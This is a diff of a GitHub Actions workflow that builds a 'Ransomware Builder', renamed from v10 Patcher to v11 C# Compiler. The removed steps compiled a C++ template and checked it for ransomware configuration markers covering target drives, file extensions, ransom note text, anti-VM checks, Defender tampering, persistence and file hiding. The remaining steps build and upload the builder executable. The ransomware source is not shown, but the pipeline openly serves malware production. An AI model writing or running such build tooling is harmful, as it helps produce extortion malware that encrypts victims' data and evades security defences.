@@ -1,4 +1,4 @@
-name: Build Ransomware Builder v10.0 (Patcher)
+name: Build Ransomware Builder v11.0 (C# Compiler)
 
 on:
   push:
@@ -13,76 +13,6 @@ jobs:
     - name: Checkout
       uses: actions/checkout@v4
     
-    # ========== 1. КОМПИЛИРУЕМ ШАБЛОН ==========
-    - name: Setup MSVC
-      uses: ilammy/msvc-dev-cmd@v1
-    
-    - name: Compile Template
-      run: |
-        Write-Host "=== Compiling template.cpp ==="
-        cl /O2 /MT /EHsc /std:c++17 /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib ws2_32.lib
-        
-        if (Test-Path template.exe) {
-          Write-Host "=== Template compiled successfully ==="
-          Get-ChildItem template.exe | Format-Table -AutoSize
-        } else {
-          Write-Host "=== Compilation FAILED ==="
-          exit 1
-        }
-    
-    # ========== 2. АНАЛИЗ МАРКЕРОВ В ШАБЛОНЕ ==========
-    - name: Analyze Template Markers
-      run: |
-        Write-Host ""
-        Write-Host "=== ANALYZING TEMPLATE MARKERS ==="
-        Write-Host ""
-        
-        $markers = @(
-          "|DRIVES|", "|EXTS|", "|ENC_EXT|", "|NOTE_NAME|", "|NOTE_CONTENT|",
-          "|FAKE_NAME|", "|ALGO|", "|FAKE_ENABLED|", "|HIDE_ENABLED|", "|ANTI_VM|",
-          "|DEFENDER|", "|PERSISTENCE|", "|HIDE_FILES|", "|DELAY|",
-          "|WALLPAPER_BASE64|", "|WALLPAPER_EXT|"
-        )
-        
-        Write-Host "Searching for markers in template.exe..."
-        Write-Host ""
-        
-        $found = 0
-        $notFound = 0
-        
-        foreach ($marker in $markers) {
-          $result = Select-String -Path template.exe -Pattern $marker -Encoding UTF8
-          if ($result) {
-            Write-Host "  [FOUND] $marker" -ForegroundColor Green
-            $found++
-          } else {
-            Write-Host "  [MISSING] $marker" -ForegroundColor Red
-            $notFound++
-          }
-        }
-        
-        Write-Host ""
-        Write-Host "=== SUMMARY ==="
-        Write-Host "  Found: $found" -ForegroundColor Green
-        Write-Host "  Missing: $notFound" -ForegroundColor Red
-        
-        if ($notFound -gt 0) {
-          Write-Host ""
-          Write-Host "WARNING: Some markers are missing!" -ForegroundColor Yellow
-          exit 1
-        }
-        
-        Write-Host ""
-        Write-Host "All markers found successfully!" -ForegroundColor Green
-    
-    # ========== 3. СОХРАНЯЕМ template.exe КАК АРТЕФАКТ ==========
-    - name: Upload Template
-      uses: actions/upload-artifact@v4
-      with:
-        name: template
-        path: template.exe
-    
-    # ========== 4. СОБИРАЕМ БИЛДЕР (C#) С ВСТРОЕННЫМ ШАБЛОНОМ ==========
     - name: Setup MSBuild
       uses: microsoft/setup-msbuild@v2
     
@@ -97,15 +27,14 @@ jobs:
         if (Test-Path "bin\Any CPU\Release\net48\builder.exe") {
           Write-Host "=== Build SUCCESS ==="
           Get-ChildItem "bin\Any CPU\Release\net48\builder.exe" | Format-Table -AutoSize
-          Copy-Item "bin\Any CPU\Release\net48\builder.exe" "RansomwareBuilder_v10_Patcher.exe"
+          Copy-Item "bin\Any CPU\Release\net48\builder.exe" "RansomwareBuilder_v11_CSharp.exe"
         } else {
           Write-Host "=== Build FAILED ==="
           exit 1
         }
     
-    # ========== 5. ЗАГРУЖАЕМ БИЛДЕР ==========
     - name: Upload Builder EXE
       uses: actions/upload-artifact@v4
       with:
-        name: RansomwareBuilder_v10_Patcher
-        path: RansomwareBuilder_v10_Patcher.exe
+        name: RansomwareBuilder_v11_CSharp
+        path: RansomwareBuilder_v11_CSharp.exe
